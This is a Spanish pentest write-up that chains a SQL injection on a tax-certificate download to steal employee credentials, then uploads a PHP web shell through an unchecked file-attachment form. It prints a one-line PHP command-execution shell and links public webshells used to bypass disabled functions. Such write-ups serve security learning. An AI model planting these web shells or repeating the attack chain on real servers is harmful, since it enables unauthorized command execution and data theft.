---
title: "Mi Primer Ejecución de Código a través de una Subida Irrestricta de Ficheros"
draft: false
weight: 50
contributors: ["Kryot"]
date: 2021-11-11T09:19:42+01:00
---

### RESUMEN
 Para la explotación del mismo, primero fue necesario explotar una sql injection de la cual se obtuvo el usuario y contraseña de los empleados registrados en la aplicación. Posteriormente, gracias a un formulario de PQRS (Peticiones, quejas, reclamos y sugerencias) que permitía adjuntar archivos fue posible ejecutar comandos en el servidor.

 ---
 ### SQL INJECTION

 Inicialmente, para la explotación de esta vulnerabilidad, se procede a solicitar la descarga de certificados tributarios.

 {{< img-simple src="sqli1.png">}}
 

 Se intercepta la solicitud de descarga para evaluar la entrada de los parámetros presentes en la misma, donde se identifica que es posible provocar un error en la sintaxis SQL al agregar una comilla simple en el valor del parámetro cédula.

 {{< img-simple src="sqli2.png">}}

Como se puede observar en la evidencia a continuación el parámetro no es sanitizado correctamente, lo que desencadena en un error en la sintaxis SQL.

 {{< img-simple src="sqli3.png">}}

Finalmente, con el fin de automatizar el proceso de explotación de dicha vulnerabilidad, se hace uso de sqlmap para infiltrar sentencias SQL y extraer información de la base de datos.

 {{< img-simple src="sqli4.png">}}

### RCE


Una vez obtenidas las credenciales a partir de la inyección SQL fue posible iniciar sesión en la aplicación con los distintos usuarios, entre los cuales se destaca el usuario "comercial", que era capaz de crear formularios PQRS y adjuntar archivos en el mismo. 

Se procedió a crear un formulario, rellenarlo con datos aleatorios y adjuntar una shell en php.

 {{< img-simple src="rce1.png">}}

 El archivo shell.php contiene la siguiente línea de código, que permitiría la ejecución de comandos en el servidor a través de la función system de php.

 ```
 <?php echo system($_GET["cmd"]); ?>
 ```

 Si bien la aplicación indicaba que solo se podían subir archivos JPG y PNG, no hubo ningun incoveninte en adjuntar un fichero php, nisiquiera hubo necesidad de realizar un bypass ya que la aplicación nunca realizaba un control sobre el fichero que se adjuntaba.

  {{< img-simple src="rce2.png">}}

  Al revisar el fichero, me encontré con que no fue posible ejecutar comandos debido a que la función system de php se encontraba correctamente deshabilitada.

 {{< img-simple src="rce3.png">}}

Posteriormente, procedí a ejecutar otro fichero php que indica las funciones potencialmente peligrosas que podemos utilizar para ejecutar comandos. Se puede descargar el script del siguiente <a href="https://raw.githubusercontent.com/l3m0n/Bypass_Disable_functions_Shell/master/shell.php" target="_blank">repositorio</a>

 {{< img-simple src="rce4.png">}}

Como se puede observar las únicas funciones disponibles eran:

```
pcntl_exec
mail
imap_open
imap_mail
error_log
mb_send_mail
putenv
ini_set
symlink
link
```

Despúes de una serie de intentos fallidos intentando utilizar algunas de las funciones habilitadas para conseguir un rce y ya quedandome sin ideas, decidí probar con una vieja y conocida webshell que esta encodeada y probablemente funcionaría. 

Para sorpresa, la webshell de <a href="https://raw.githubusercontent.com/TheBinitGhimire/Web-Shells/master/PHP/smevk.php" target="_blank">Smevk</a> funcionó.

 {{< img-simple src="rce5.png">}}

 Luego, sabiendo que la solución era utilizar una webshell encodeada decidí utilizar <a href="https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/source/b374k-2.3.php" target="_blank">b374k</a> que es mas nueva, intuitiva, útil y elegante.

{{< img-simple src="rce6.png">}}

En conclusión, a veces la solución es más sencilla de lo que uno cree y jamás hay que subestimar el poder de las viejas webshells.